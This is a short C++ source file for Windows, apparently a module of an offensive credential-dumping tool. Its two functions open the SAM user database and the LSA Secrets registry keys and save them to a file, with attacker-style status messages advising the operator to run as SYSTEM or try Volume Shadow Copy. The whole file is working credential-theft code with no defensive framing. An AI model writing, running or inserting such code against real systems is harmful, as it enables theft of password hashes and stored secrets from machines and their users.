#include "creds_sam.h"
#include <cstdio>
#include <windows.h>
#include <lm.h>
#pragma comment(lib, "advapi32.lib")

bool DumpSamToFile(const char* outPath) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        printf("[-] Cannot open SAM. Run as SYSTEM.\n");
        return false;
    }
    DWORD err = RegSaveKeyA(hKey, outPath, NULL);
    RegCloseKey(hKey);
    if (err == ERROR_SUCCESS) {
        printf("[+] SAM hive saved to %s\n", outPath);
        return true;
    } else {
        printf("[-] Failed to save SAM (error %d). Try using Volume Shadow Copy.\n", err);
        return false;
    }
}

bool DumpLsaSecrets(const char* outPath) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\Secrets", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        printf("[-] Cannot open LSA Secrets. Run as SYSTEM.\n");
        return false;
    }
    DWORD err = RegSaveKeyA(hKey, outPath, NULL);
    RegCloseKey(hKey);
    if (err == ERROR_SUCCESS) {
        printf("[+] LSA Secrets saved to %s\n", outPath);
        return true;
    } else {
        printf("[-] Failed to save LSA Secrets (error %d).\n", err);
        return false;
    }
}